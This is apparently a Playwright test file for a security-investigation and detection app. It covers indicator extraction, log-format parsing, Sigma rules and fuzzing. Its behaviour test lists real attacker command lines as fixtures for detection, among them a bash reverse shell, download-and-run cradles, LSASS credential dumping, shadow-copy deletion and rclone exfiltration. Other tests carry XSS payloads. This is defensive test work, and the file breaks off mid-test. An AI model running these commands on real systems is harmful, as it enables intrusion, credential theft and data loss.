// Real-world input, not the demo data: messy indicators, many log formats, behaviour
// on real command lines (and benign look-alikes that must NOT be flagged), duplicates
// that must and must not merge, odd timelines, broken files, and random input fed to
// every engine. Each check states the right answer, not just "no crash".
const { test, expect } = require('@playwright/test');
const { open, noErrors } = require('./helpers');

test('indicators: defanged, unicode, IPv6, hashes and the things that are NOT indicators', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { const X = t => E.extract(t).map(e => e.k + ':' + e.v).sort(); return {
    defang:X('C2 at hxxps://evil[.]example[.]com/a?b=1, 45[.]33[.]32[.]156, user[at]corp[.]com, admin(at)site(.)com and evil{.}net'),
    idn:X('visit раураl.com and xn--80ak6aa92e.com'),
    ipv6:X('connected to 2001:db8::1 and fe80::1%eth0'),
    email:X('mail john.doe+tag@example.co.uk, "Bob" <Bob@Sub.Example.ORG>'),
    hash:X('md5 d41d8cd98f00b204e9800998ecf8427e sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'),
    cve:X('Patched cve-2021-44228 and CVE-2024-3400.'),
    trailing:X('Go to https://ex.com/a). Or https://ex.com/b.'),
    btc:X('pay bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'),
    none:[X('The meeting is at 10.30 on Monday, version 2.1, see section 4.2.1'), X('Windows 10.0.17763 build 1.2'), X('ClientId {3F2504E0-4F89-11D3-9A0C-0305E82C3301}'), X('opened invoice.pdf and notes.txt'), X('')],
  }; });
  expect(R.defang).toEqual(expect.arrayContaining(['ipv4:45.33.32.156', 'domain:evil.example.com', 'url:https://evil.example.com/a?b=1', 'email:user@corp.com', 'email:admin@site.com', 'domain:evil.net']));
  expect(R.idn).toEqual(['domain:xn--80ak6aa92e.com', 'domain:раураl.com']);              // kept whole, never cut to "l.com"
  expect(R.ipv6).toEqual(expect.arrayContaining(['ipv6:2001:db8::1', 'ipv6:fe80::1']));
  expect(R.email).toEqual(['email:bob@sub.example.org', 'email:john.doe+tag@example.co.uk']);
  expect(R.hash).toEqual(expect.arrayContaining(['md5:d41d8cd98f00b204e9800998ecf8427e', 'sha1:da39a3ee5e6b4b0d3255bfef95601890afd80709', 'sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855']));
  expect(R.cve).toEqual(['cve:CVE-2021-44228', 'cve:CVE-2024-3400']);
  expect(R.trailing).toEqual(expect.arrayContaining(['url:https://ex.com/a', 'url:https://ex.com/b']));
  expect(R.btc).toEqual(['btc:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh']);
  for (const n of R.none) expect(n).toEqual([]);                                            // prose, versions, GUIDs, documents: nothing
  noErrors(errors);
});

test('log formats: the same kind of event from nine products is read into the same fields, and a Sigma rule fires on all of them', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const L = {
      sysmonXml: '<Event><System><EventID>1</EventID><Computer>WS1</Computer></System><EventData><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell -nop -enc SQBFAFgA</Data><Data Name="ParentImage">C:\\Windows\\explorer.exe</Data></EventData></Event>',
      ecsJson: '{"@timestamp":"2026-11-01T10:00:00Z","host":{"name":"WS2"},"process":{"command_line":"powershell -nop -enc SQBFAFgA","executable":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"},"event":{"code":"1"}}',
      sysmonKv: 'EventID=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell -nop -enc SQBFAFgA" User=CORP\\bob',
      winText: 'A new process has been created.\nCreator Subject:\n  Account Name: bob\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Process Command Line: powershell -nop -enc SQBFAFgA\n  Creator Process Name: C:\\Windows\\explorer.exe',
      winTextOneLine: 'A new process has been created. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Process Command Line: powershell -nop -enc SQBFAFgA',
    };
    const net = {
      cef: 'CEF:0|Vendor|Product|1.0|100|Blocked|7|src=10.0.0.5 dst=203.0.113.9 dpt=443 suser=alice act=blocked',
      leef: 'LEEF:2.0|IBM|QRadar|1.0|Login|src=192.0.2.4\tusrName=bob',
      ssh: 'Nov  1 10:00:00 web01 sshd[123]: Failed password for invalid user admin from 198.51.100.7 port 51515 ssh2',
      apache: '198.51.100.7 - - [01/Nov/2026:10:00:00 +0000] "GET /wp-login.php HTTP/1.1" 404 512 "-" "curl/8.0"',
      forti: 'date=2026-11-01 time=10:00:00 devname=FGT logid=0000000013 srcip=10.1.1.1 dstip=8.8.8.8 dstport=53 action=accept',
    };
    ensureRules(); const rule = DB.rules.find(r => r.title === 'PowerShell Encoded Command Execution'), P = sigmaParse(rule.code);
    const proc = Object.fromEntries(Object.entries(L).map(([k, t]) => { const f = recFields({ title: '', body: t, host: '', source: '' }); return [k, { img: (f.image || '').split('\\').pop(), cmd: f.commandline || '', fires: sigmaEval(P, f) }]; }));
    const benign = recFields({ title: '', body: 'EventID=1 Image="C:\\Windows\\System32\\cmd.exe" CommandLine="cmd /c dir"', host: '', source: '' });
    const n = Object.fromEntries(Object.entries(net).map(([k, t]) => { const p = parseLog(t); return [k, p ? { fmt: p.format, n: p.norm } : null]; }));
    return { proc, benignFires: sigmaEval(P, benign), net: n, empty: parseLog(''), junk: parseLog('just some words without structure') };
  });
  for (const [k, v] of Object.entries(R.proc)) { expect(v.img, k).toBe('powershell.exe'); expect(v.cmd, k).toContain('-enc'); expect(v.fires, k).toBe(true); }
  expect(R.benignFires).toBe(false);
  expect(R.net.cef.n['src.ip']).toBe('10.0.0.5'); expect(R.net.cef.n['dst.port']).toBe('443'); expect(R.net.cef.n.user).toBe('alice');
  expect(R.net.leef.n['src.ip']).toBe('192.0.2.4'); expect(R.net.leef.n.user).toBe('bob');
  expect(R.net.ssh.n['src.ip']).toBe('198.51.100.7'); expect(R.net.ssh.n.user).toBe('admin'); expect(R.net.ssh.fmt).toContain('SSH');
  expect(R.net.apache.n['src.ip']).toBe('198.51.100.7'); expect(R.net.apache.n.url).toBe('/wp-login.php');
  expect(R.net.forti.fmt).toContain('FortiGate'); expect(R.net.forti.n['dst.ip']).toBe('8.8.8.8');
  expect(R.empty).toBeNull();
  noErrors(errors);
});

test('behaviour: real attacker command lines are recognised; everyday admin commands are not', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { const tags = t => E.observations({ title: '', body: t, tags: [], ents: E.extract(t), host: '' }).map(o => o.tag);
    const bad = [['powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', 'encoded'], ['certutil -urlcache -split -f http://203.0.113.5/a.exe a.exe', 'download'], ['bitsadmin /transfer j http://x.example/a.exe C:\\a.exe', 'download'],
      ['powershell IEX (New-Object Net.WebClient).DownloadString("http://x/a")', 'download'], ['curl -fsSL http://x.example/i.sh | bash', 'download'], ['wevtutil cl Security', 'anti-forensics'], ['history -c', 'anti-forensics'],
      ['vssadmin delete shadows /all /quiet', 'impact'], ['bcdedit /set {default} recoveryenabled No', 'impact'], ['schtasks /create /tn Upd /tr C:\\x.exe /sc onlogon', 'persistence'], ['sc create svc binPath= C:\\x.exe', 'persistence'],
      ['echo "* * * * * /tmp/x" >> /etc/crontab', 'persistence'], ['net user hacker P@ssw0rd /add', 'account'], ['net localgroup administrators hacker /add', 'account'], ['mshta http://evil.example/x.hta', 'proxy execution'],
      ['rundll32.exe C:\\Users\\Public\\x.dll,Start', 'proxy execution'], ['regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll', 'proxy execution'], ['procdump64.exe -ma lsass.exe out.dmp', 'credentials'],
      ['rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 624 C:\\temp\\l.dmp full', 'credentials'], ['reg save HKLM\\SAM sam.hiv', 'credentials'], ['nltest /domain_trusts', 'discovery'], ['net group "domain admins" /domain', 'discovery'],
      ['psexec \\\\FS01 -s cmd', 'lateral movement'], ['wmic /node:10.0.0.9 process call create calc', 'lateral movement'], ['Set-MpPreference -DisableRealtimeMonitoring $true', 'defenses off'], ['netsh advfirewall set allprofiles state off', 'defenses off'],
      ['7z a -pS3cret loot.7z C:\\Finance', 'staging'], ['rclone copy C:\\Finance mega:loot', 'exfiltration'], ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'c2'], ['Invoice.pdf.exe opened from Downloads', 'lure']];
    const ok = ['schtasks /query /fo list', 'net user bob', 'certutil -hashfile a.exe SHA256', 'wevtutil qe Security /c:5', 'vssadmin list shadows', 'whoami', 'curl https://example.com -o page.html', 'tar -czf backup.tgz /home',
      'Get-Service WinDefend', 'regsvr32 /s mydll.dll', 'ipconfig /all', 'git push origin main', 'The quarterly report is attached', 'ping 8.8.8.8', 'Get-ChildItem C:\\Users'];
    return { bad: bad.map(([t, want]) => [t, want, tags(t)]), ok: ok.map(t => [t, tags(t)]) }; });
  for (const [t, want, got] of R.bad) expect(got, t).toContain(want);
  for (const [t, got] of R.ok) expect(got, t).toEqual([]);
  noErrors(errors);
});

test('duplicates: written differently but the same → merged; similar but different → kept apart', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const c = { id: 'c-dup', code: 'DUP-1', name: 'Dups', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    const T = (type, v) => { const t = TYPES[type]; const e = { id: uid('v'), caseId: 'c-dup', type, fields: { [t.fields[0][0]]: v }, priority: 'low', starred: false, tags: [], notes: '', src: '', created: Date.now() }; normEntry(e); DB.entries.push(e); return e; };
    const same = [['email', 'Bob@Corp.com', 'bob@corp[.]com'], ['domain', 'www.Evil.example', 'evil.example.'], ['url', 'https://x.example/a/', 'hxxps://x.example/a'], ['phone', '+1 (555) 010-2030', '555.010.2030'],
      ['person', 'Jordan Okafor', 'Okafor, Jordan'], ['person', 'José Núñez', 'Jose Nunez'], ['username', '@lampmaker', 'LampMaker'], ['ip', '203.0.113.7', '203.0.113.7']];
    const diff = [['email', 'john.doe@corp.com', 'jane.doe@corp.com'], ['domain', 'mail.example.com', 'example.com'], ['phone', '+1 555 010 2030', '+1 555 010 2031'], ['person', 'John Smith', 'John Smithson'],
      ['username', 'bob1', 'bob2'], ['crypto', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', '1a1zp1ep5qgefi2dmptftl5slmv7divfna'], ['ip', '203.0.113.7', '203.0.113.70']];
    const pairs = [...same.map(x => ['same', ...x]), ...diff.map(x => ['diff', ...x])].map(([want, type, a, b]) => { const A = T(type, a), B = T(type, b); return { want, type, a, b, A: A.id, B: B.id }; });
    const G = dupGroups('c-dup'), together = (x, y) => G.some(g => g.G.some(e => e.id === x) && g.G.some(e => e.id === y));
    const loose = G.filter(g => !g.sure).map(g => g.G.map(primary));
    return { res: pairs.map(p => [p.want, p.type, p.a, p.b, together(p.A, p.B)]), loose };
  });
  for (const [want, type, a, b, got] of R.res) expect(got, `${type}: ${a} vs ${b}`).toBe(want === 'same');
  noErrors(errors);
});

test('odd timelines: empty, one event, all at the same second, no times, far future — patterns and the attack chain stay sensible', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const out = {}, mk = (id, ts, body, tags) => ({ id, caseId: 'c-odd', type: 'evidence', title: id, body: body || '', tsRaw: '', tsZone: 'explicit', ts, host: 'H', source: 's', tags: tags || [], ents: E.extract(body || ''), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' });
    const c = { id: 'c-odd', code: 'ODD-1', name: 'Odd', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    const run = (name, recs) => { DB.records = DB.records.filter(r => r.caseId !== 'c-odd').concat(recs); mutate(name); const D = derive('c-odd'); let A, C, html;
      try { A = tlxAnalyse(D); C = chainOf(c, D); html = tlxView(D) + chainView(c, D); } catch (e) { return 'THROW ' + e.message; }
      return { empty: !!A.empty, bursts: (A.bursts || []).length, gaps: (A.gaps || []).length, nan: /NaN|undefined|Infinity/.test(html), first: A.first ? A.first.r.id : null, future: A.time.future.length, seen: C.seen.length }; };
    const t0 = Date.UTC(2026, 9, 1, 9);
    out.none = run('none', []);
    out.one = run('one', [mk('a', t0, 'powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA')]);
    out.same = run('same', Array.from({ length: 50 }, (_, i) => mk('s' + i, t0, 'event ' + i)));
    out.noTs = run('noTs', [mk('x', null, 'x'), mk('y', null, 'y')]);
    out.future = run('future', [mk('f1', t0, 'a'), mk('f2', t0 + 6e4, 'b'), mk('f3', Date.now() + 400 * 864e5, 'c')]);
    out.real = run('real', [mk('r1', t0, 'Invoice.pdf.exe opened', ['phishing']), mk('r2', t0 + 6e4, 'powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'), mk('r3', t0 + 12e4, 'schtasks /create /tn x /tr c:\\x.exe'), mk('r4', t0 + 36e5 * 30, 'rclone copy C:\\data mega:x')]);
    return out; });
  for (const [k, v] of Object.entries(R)) { expect(typeof v, k).toBe('object'); expect(v.nan, k + ' shows NaN/undefined').toBe(false); }
  expect(R.none.empty).toBe(true); expect(R.one.empty).toBe(true); expect(R.noTs.empty).toBe(true);
  expect(R.same.bursts).toBeLessThanOrEqual(1); expect(R.same.gaps).toBe(0);
  expect(R.future.future).toBe(1);
  expect(R.real.first).toBe('r1'); expect(R.real.seen).toBeGreaterThanOrEqual(4); expect(R.real.gaps).toBeGreaterThanOrEqual(1);
  noErrors(errors);
});

test('broken and unusual files: not-a-picture, empty, SVG and a broken video are stored without crashing anything', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/media');
  const R = await page.evaluate(async () => {
    const files = [new File([new Uint8Array([1, 2, 3, 4, 5])], 'fake.jpg', { type: 'image/jpeg' }), new File([], 'empty.png', { type: 'image/png' }),
      new File(['<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script><rect width="10" height="10"/></svg>'], 'x.svg', { type: 'image/svg+xml' }),
      new File([new Uint8Array(4096).fill(7)], 'broken.mp4', { type: 'video/mp4' }), new File(['<html><script>alert(1)</script>hi</html>'], 'page.html', { type: 'text/html' })];
    draft.caseId = 'c-lantern'; await attachFiles(files.slice(0, 4)); await importWebPages([files[4]]);
    const I = caseMediaItems('c-lantern'); return { names: I.map(x => x.a.name).sort(), insight: (() => { try { return picView(theCase('c-lantern')).length > 0; } catch (e) { return 'THROW ' + e.message; } })() }; });
  expect(R.names).toEqual(expect.arrayContaining(['broken.mp4', 'empty.png', 'fake.jpg', 'x.svg']));
  expect(R.insight).toBe(true);
  await page.evaluate(() => { UI.mdV = 'files'; renderMain(); }); await page.waitForTimeout(800);
  expect(await page.evaluate(() => window.__alerted || false)).toBe(false);
  // Playwright's trace recorder re-reads blob: pictures from inside the page, which the app's own security policy refuses; that is the recorder, not the app
  noErrors(errors.filter(e => !/Connecting to 'blob:/.test(e)));
});

test('every built-in Sigma rule converts to every SIEM and survives the evasion check', async ({ page }) => {
  test.setTimeout(120_000);
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { ensureRules(); const bad = [], S = DB.rules.filter(r => r.type === 'sigma');
    const balanced = q => { let d = 0, inS = false, inD = false; for (let i = 0; i < q.length; i++) { const ch = q[i]; if (ch === '\\') { i++; continue; } if (ch === '"' && !inS) inD = !inD; else if (ch === "'" && !inD) { if (q[i + 1] === "'" && inS) { i++; continue; } inS = !inS; } else if (!inS && !inD) { if (ch === '(') d++; if (ch === ')') d--; if (d < 0) return false; } } return d === 0 && !inS && !inD; };
    let conv = 0, ev = 0;
    for (const r of S) { for (const b of Object.keys(DL_BACK)) { let q; try { q = sigmaToQuery(r.code, b); } catch (e) { bad.push(r.title + ' / ' + b + ': THROW ' + e.message); continue; }
        if (q.error) continue; conv++; if (!q.q || /undefined|NaN|\[object/.test(q.q)) bad.push(r.title + ' / ' + b + ': empty or undefined'); else if (!balanced(q.q)) bad.push(r.title + ' / ' + b + ': unbalanced'); }
      try { dlEvasion(r, r.code); ev++; } catch (e) { bad.push(r.title + ' evasion: THROW ' + e.message); } }
    return { n: S.length, conv, ev, bad: bad.slice(0, 15) }; });
  expect(R.bad).toEqual([]);
  expect(R.conv).toBeGreaterThan(R.n * 5 * 0.95);
  noErrors(errors);
});

test('random input never breaks the engines', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    let seed = 7; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    const pool = 'aZ09 .:/\\-_@[](){}<>|"\'=,;!?#$%^&*~`\n\t\u00e9\u0436\u4e2d\u{1F600}\u200b\u0000hxxp://[.]10.0.0.1 CEF:0| LEEF:2.0| <Event><EventID> {"a": EventID=4688 New Process Name: -enc ';
    const gen = n => { let s = ''; for (let i = 0; i < n; i++) s += pool[Math.floor(rnd() * pool.length)]; return s; };
    const fails = []; let slow = 0;
    for (let i = 0; i < 400; i++) { const s = gen(1 + Math.floor(rnd() * (i % 50 === 0 ? 20000 : 300))); const t0 = performance.now();
      for (const [name, fn] of [['extract', () => E.extract(s)], ['parseLog', () => parseLog(s)], ['recFields', () => recFields({ title: s.slice(0, 20), body: s, host: '', source: '' })], ['observations', () => E.observations({ title: '', body: s, tags: [], ents: E.extract(s), host: '' })],
        ['sigma', () => { const p = sigmaParse('detection:\n    s:\n        CommandLine|contains: \'' + s.slice(0, 30).replace(/'/g, '') + '\'\n    condition: s'); return p.cond ? sigmaEval(p, recFields({ title: '', body: s, host: '', source: '' })) : 0; }],
        ['noteInline', () => noteInline(s)], ['dupNorm', () => dupNorm({ type: 'person', fields: { name: s } })], ['lineTime', () => E.lineTime(s)]]) { try { fn(); } catch (e) { fails.push(name + ': ' + e.message + ' :: ' + JSON.stringify(s.slice(0, 60))); } }
      if (performance.now() - t0 > 400) slow++; }
    const inl = noteInline('<img src=x onerror=alert(1)> **b** `c`');
    return { fails: fails.slice(0, 10), slow, safe: !/<img/.test(inl) && /<b>b<\/b>/.test(inl) }; });
  expect(R.fails).toEqual([]); expect(R.slow).toBe(0); expect(R.safe).toBe(true);
  noErrors(errors);
});

test('a workspace with nothing in it: every new screen draws', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { DB.cases = []; DB.records = []; DB.entries = []; DB.links = []; DB.notes = []; DB.active = null; DB.autos = []; mutate('empty'); });
  for (const h of ['#/today', '#/notes', '#/playbooks', '#/detections', '#/feeds', '#/home']) { await page.evaluate(h => go(h), h); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  await page.evaluate(() => { UI.pbTab = 'auto'; go('#/playbooks'); }); await expect(page.locator('.au-intro')).toBeVisible();
  await page.evaluate(() => { const c = { id: 'c-new', code: 'NEW-1', name: 'New', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c); DB.active = 'c-new'; mutate('c'); });
  for (const tab of ['overview', 'vault', 'entities', 'timeline', 'media', 'graph', 'analysis']) { await page.evaluate(t => go(caseHash('c-new', t)), tab); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  for (const m of ['patterns', 'chain']) { await page.evaluate(m => { UI.tlMode = m; go(caseHash('c-new', 'timeline')); renderMain(); }, m); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  await page.evaluate(() => { UI.mdV = 'pic'; go(caseHash('c-new', 'media')); renderMain(); }); await expect(page.locator('#main')).not.toContainText('failed to draw');
  noErrors(errors);
});

test('the graph button on a vault card opens the graph on that entry', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/vault');
  await page.evaluate(() => { DB.prefs.vLay = 'cards'; renderMain(); });
  const card = page.locator('.ec2[data-id=v-actor]'); await card.hover();
  await card.locator('[data-act=showInGraph]').click();
  await expect.poll(() => page.evaluate(() => location.hash)).toBe('#/case/c-lantern/graph');
  await expect.poll(() => page.evaluate(() => typeof cy !== 'undefined' && cy && cy.getElementById('v-actor').selected())).toBe(true);
  // the same from the details panel
  await page.evaluate(() => go(caseHash('c-lantern', 'vault'))); await expect(page.locator('.ec2').first()).toBeVisible();
  await page.evaluate(() => selectEntry('v-handle'));
  await page.locator('#insp [data-act=showInGraph]').click();
  await expect.poll(() => page.evaluate(() => typeof cy !== 'undefined' && cy && cy.getElementById('v-handle').selected())).toBe(true);
  noErrors(errors);
});

test('broken versions of real log formats never break the importer', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const samples = [
      'timestamp,host,user,event\n2024-03-01T10:00:00Z,WS-01,alice,logon\n2024-03-01T10:05:00Z,WS-01,alice,"cmd.exe /c whoami"',
      '{"@timestamp":"2024-03-01T10:00:00Z","event":{"code":4688},"process":{"command_line":"powershell -enc SQBFAFgA"}}\n{"@timestamp":"2024-03-01T10:01:00Z","host":{"name":"DC01"}}',
      '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4624</EventID><TimeCreated SystemTime="2024-03-01T10:00:00.000Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">bob</Data><Data Name="LogonType">10</Data></EventData></Event>',
      'CEF:0|Vendor|FW|1.0|100|Blocked|5|src=10.0.0.5 dst=203.0.113.9 dpt=443 act=block rt=Mar 01 2024 10:00:00',
      'Mar  1 10:00:00 web01 sshd[123]: Failed password for root from 203.0.113.50 port 51234 ssh2',
      '{"eventVersion":"1.08","eventTime":"2024-03-01T10:00:00Z","eventName":"ConsoleLogin","sourceIPAddress":"198.51.100.7","userIdentity":{"type":"IAMUser","userName":"ops"}}',
      '#fields\tts\tuid\tid.orig_h\tid.resp_h\tquery\n1709287200.0\tC1\t10.0.0.5\t8.8.8.8\tevil.example',
      '<Events><Event><System><EventID>4625</EventID><TimeCreated SystemTime="2024-03-01T13:00:00.000Z"/></System><EventData><Data Name="TargetUserName">admin</Data></EventData></Event><Event><System><EventID>4624</EventID></System></Event></Events>',
      'CreationDate,UserIds,Operations,AuditData\r\n2024-03-01T12:00:00Z,a@b.example,New-InboxRule,"{""CreationTime"":""2024-03-01T12:00:00"",""Operation"":""New-InboxRule"",""UserId"":""a@b.example"",""ClientIP"":""[2001:db8::7]:5"",""Workload"":""Exchange""}"',
      '[{"published":"2024-03-01T11:00:00Z","eventType":"user.session.start","actor":{"alternateId":"e@x.example"},"client":{"ipAddress":"45.33.32.156"},"outcome":{"result":"FAILURE"}}]',
    ];
    let seed = 11; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648, pick = a => a[Math.floor(rnd() * a.length)];
    const mutate = s => { const k = Math.floor(rnd() * 10), i = Math.floor(rnd() * s.length);
      switch (k) {
        case 0: return s.slice(0, i);                                             // cut off mid-way
        case 1: return '﻿' + s.replace(/\n/g, '\r\n');                      // BOM and Windows line ends
        case 2: return s.slice(0, i) + s.slice(i + 1 + Math.floor(rnd() * 20));   // bytes missing
        case 3: return s.slice(0, i) + 'x'.repeat(200000) + s.slice(i);          // one huge field
        case 4: return s.replace(/"/g, () => rnd() < .3 ? '' : '"');              // broken quoting
        case 5: return '['.repeat(5000) + s + ']'.repeat(10);                      // deeply nested
        case 6: return Array(3000).fill(s).join('\n');                             // many rows
        case 7: return s.replace(/\d/g, () => rnd() < .2 ? '\u0000' : String(Math.floor(rnd() * 10)));
        case 8: return s.split('').reverse().join('');
        default: return s + '\n' + pick(samples).slice(0, i);                      // two formats mixed
      } };
    /* the file importer's own steps: read the format, guess the columns, make records, then every engine on them */
    const importAs = s => { const P = logParse(s, 'x.log'), cols = [...new Set(P.rows.slice(0, 200).flatMap(r => Object.keys(r)))], M = { time: logGuess(cols, 'time'), title: logGuess(cols, 'title'), host: logGuess(cols, 'host'), source: logGuess(cols, 'source') };
      const L = P.rows.slice(0, 300).map(r => logRec(r, M, 'x.log')); L.slice(0, 60).forEach(r => { E.observations(r); recFields(r); parseLog(r.body); }); return L; };
    const fails = []; let slow = 0, recs = 0;
    for (let i = 0; i < 160; i++) { const s = mutate(pick(samples)), t0 = performance.now();
      try { recs += importAs(s).length; }
      catch (e) { fails.push(e.message + ' :: ' + JSON.stringify(s.slice(0, 80))); }
      if (performance.now() - t0 > 1500) slow++; }
    // the clean samples still import
    const clean = samples.map(s => importAs(s).length);
    const csvTimes = importAs(samples[0]).map(r => r.ts).filter(Boolean).length;          // times read from the right column
    return { fails: fails.slice(0, 8), slow, recs, clean, csvTimes };
  });
  expect(R.fails).toEqual([]); expect(R.slow).toBe(0);
  expect(R.clean.every(n => n >= 1)).toBe(true); expect(R.clean[0]).toBe(2); expect(R.csvTimes).toBe(2);
  noErrors(errors);
});

test('rules over one case: what fired, what looks suspicious but nothing caught, noisy rules — and drafting from a blind spot closes it', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => {
    const c = { id: 'c-cr', code: 'CR-1', name: 'Rules check', color: '#6366f1', status: 'active', created: Date.now(), updated: Date.now() }; DB.cases.push(c);
    const T = Date.UTC(2024, 2, 1, 10), mk = (i, title, body, extra) => ({ id: 'r-cr' + i, caseId: 'c-cr', type: 'evidence', title, body, ts: T + i * 60000, tsRaw: '', source: 'test', host: 'WS-01', tags: [], ents: extractRich(body), addedAt: Date.now(), ...extra });
    DB.records.push(
      mk(1, 'Encoded PowerShell', 'EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"'),
      mk(2, 'Odd service on DC', 'EventID=7045 ServiceName=zzqx ImagePath=C:\\ProgramData\\zzqx\\svc.exe', { tags: ['persistence'] }),
      mk(3, 'User logon', 'EventID=4624 TargetUserName=alice LogonType=2'),
      mk(4, 'User logon', 'EventID=4624 TargetUserName=bob LogonType=2'),
      mk(5, 'Browser start', 'EventID=1 Image=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe CommandLine=chrome.exe'),
      mk(6, 'Explorer', 'EventID=1 Image=C:\\Windows\\explorer.exe CommandLine=explorer.exe'));
    DB.rules.unshift({ id: 'r-loud', type: 'sigma', title: 'Anything with EventID', desc: '', code: "title: Anything with EventID\nlogsource:\n    product: windows\ndetection:\n    s:\n        eventid|re: '.+'\n    condition: s\nlevel: low", severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], created: Date.now(), updated: Date.now() });
    rev++; DB.active = 'c-cr'; UI.tlMode = 'rules'; go(caseHash('c-cr', 'timeline'));
  });
  await expect(page.locator('.cr-sum')).toBeVisible({ timeout: 20000 });
  const R = await page.evaluate(() => ({ n: CR.res.n, fired: CR.res.rows.map(x => x.r.id), blind: CR.res.blind.map(x => x.r.id), noisy: CR.res.noisy.map(x => x.r.id),
    encCaughtBy: (CR.res.caught.get('r-cr1') || []).filter(r => r.id !== 'r-loud').length }));
  expect(R.n).toBe(6);
  expect(R.encCaughtBy).toBeGreaterThan(0);                     // a built-in rule catches the encoded PowerShell
  expect(R.noisy).toEqual(['r-loud']);                          // fires on all six events
  // the loud rule catches everything, so nothing is "not caught" while it is on; take it out and look again
  await page.evaluate(() => { DB.rules = DB.rules.filter(r => r.id !== 'r-loud'); mutate('test'); renderMain(); });
  await expect.poll(() => page.evaluate(() => CR.res && !DB.rules.some(r => r.id === 'r-loud') && CR.sig === crSig('c-cr') && CR.res.blind.map(x => x.r.id).join())).toContain('r-cr2');
  const blind = await page.evaluate(() => CR.res.blind.map(x => x.r.id));
  expect(blind).not.toContain('r-cr3'); expect(blind).not.toContain('r-cr5');   // harmless events are not blind spots
  expect(blind).not.toContain('r-cr1');                                         // caught by a rule
  await page.click('[data-act=crf][data-v=blind]');
  await expect(page.locator('.cr-bl li:has-text("Odd service on DC")')).toContainText('persistence');
  // draft a rule from the blind spot: it then counts as caught
  const n0 = await page.evaluate(() => DB.rules.length);
  await page.locator('.cr-bl li:has-text("Odd service on DC") [data-act=crDraft]').click();
  expect(await page.evaluate(() => DB.rules.length)).toBe(n0 + 1);
  await page.evaluate(() => { DB.active = 'c-cr'; UI.tlMode = 'rules'; go(caseHash('c-cr', 'timeline')); });
  await expect.poll(() => page.evaluate(() => CR.res && CR.sig === crSig('c-cr') && !CR.res.blind.some(x => x.r.id === 'r-cr2'))).toBe(true);
  // opening an event and a rule from the view
  await page.click('[data-act=crf][data-v=caught]');
  await page.locator('.cr-r [data-act=crRule]').first().click(); await expect(page).toHaveURL(/#\/detections/);
  noErrors(errors);
});

test('rule health over time: test history and regressions, rules without tests, look-alike rules, what changed since the last check', async ({ page }) => {
  const errors = await open(page, '#/detections');
  const R = await page.evaluate(async () => {
    const code = "title: Whoami run\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    s:\n        Image|endswith: '\\\\whoami.exe'\n    condition: s\nlevel: low";
    const mk = (id, title, c, tests) => ({ id, type: 'sigma', title, desc: '', code: c, severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], tests, created: Date.now(), updated: Date.now() });
    const r = mk('r-hw', 'Whoami run', code, [{ kind: 'hit', text: 'Image="C:\\Windows\\System32\\whoami.exe"' }, { kind: 'miss', text: 'Image="C:\\Windows\\notepad.exe"' }]);
    DB.rules.unshift(r, mk('r-untested', 'My untested rule', code.replace('whoami', 'net1'), undefined), mk('r-twin', 'Whoami run again', code.replace('title: Whoami run', 'title: Whoami run again'), undefined));
    // two saves that pass, then an edit that breaks a test
